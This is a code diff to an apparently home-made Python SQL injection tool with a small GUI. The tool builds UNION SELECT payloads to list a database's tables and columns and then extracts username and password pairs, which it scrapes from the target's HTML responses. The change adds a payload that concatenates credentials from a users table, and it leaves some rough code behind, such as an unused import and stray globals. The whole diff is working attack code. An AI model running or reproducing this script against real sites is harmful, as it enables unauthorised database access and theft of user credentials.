@@ -5,10 +5,14 @@ from bs4 import BeautifulSoup
 import re
 import tkinter as tk
 from tkinter import messagebox, StringVar
+import difflib
+import diff
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+diff = difflib.HtmlDiff()
+
 
 def perform_request(url, sql_payload, method, post_data):
     if method == 'GET':
@@ -108,11 +112,15 @@ def generate_sql_payload(num_columns, text_column_index,detail,users_table=None)
     if detail == "table_name":
         sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.tables--"
     elif detail == "column_name":
-        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " information_schema.columns WHERE table_name = '%s'--" % users_table
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM information_schema.columns WHERE table_name = '%s'--" % users_table
+    elif detail == "all":
+        null_columns[text_column_index - 1] = "CONCAT(username, '~~', password)"
+        sql_payload = "' UNION SELECT " + ", ".join(null_columns) + " FROM users--"  #"  WHERE table_name = '%s'--" % users_table
     return sql_payload  
 
 def exploit_sqli_users_table(url, method, post_data=None):
     print("[+] Figuring out number of columns...")
+    global num_col
     num_col = exploit_sqli_column_number(url,method,post_data)
     print(num_col)
     if num_col:
@@ -120,6 +128,7 @@ def exploit_sqli_users_table(url, method, post_data=None):
         print("[+] Figuring out which column contains text...")
         if num_col =="one column":
             num_col=1
+            global string_column
             string_column = exploit_sqli_string_field(url, num_col,method,post_data)
         string_column = exploit_sqli_string_field(url, num_col,method,post_data)
         if string_column:
@@ -138,20 +147,27 @@ def exploit_sqli_users_table(url, method, post_data=None):
 
 
 def exploit_sqli_users_columns(url, users_table, method, post_data,num_col,string_column):
-    sql_payload = generate_sql_payload(num_col,string_column,"table_name",users_table)
+    sql_payload = generate_sql_payload(num_col,string_column,"column_name",users_table)
+    print(sql_payload)
     res = perform_request(url, sql_payload, method, post_data)
     soup = BeautifulSoup(res.text, 'html.parser')
-    username_column = soup.find(text=re.compile('.*USERNAME.*'))
-    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
+    username_column = soup.find(text=re.compile('.*username.*'))
+    password_column = soup.find(text=re.compile('.*password.*'))
     return username_column, password_column
 
 def exploit_sqli_administrator_cred(url, users_table, username_column, password_column, method='GET', post_data=None):
-    sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, users_table)
+    # sql_payload = "' UNION select CONCAT(%s, '~', %s)sfrom %s--" % (username_column, password_column, users_table)
+    sql_payload = generate_sql_payload(num_col,string_column,"all",users_table)
     res = perform_request(url, sql_payload, method, post_data)
+    res1 = requests.get(url)
     soup = BeautifulSoup(res.text, 'html.parser')
-    admin_password = soup.find(text="administrator").parent.findNext('td').contents[0]
-    return admin_password
+    soup2 = BeautifulSoup(res1.text, 'html.parser')
+    # output = difference(soup, soup2)
 
+    tilde_values = [str(tag) for tag in soup.find_all(lambda tag: '~' in tag.text)]
+    for value in tilde_values:
+        print(value)
+    return tilde_values
 def main():
     def execute_sql_injection():
         try:
@@ -163,6 +179,7 @@ def main():
         result_text.delete(1.0, tk.END)  # Clear previous results
 
         method = 'GET' if method_var.get() == 0 else 'POST'
+        post_data= None
         if method == 'POST':
             data = post_data_entry.get() if method == 'POST' else None
             post_data={key: value for key, value in (item.split('=') for item in data.split('&'))}
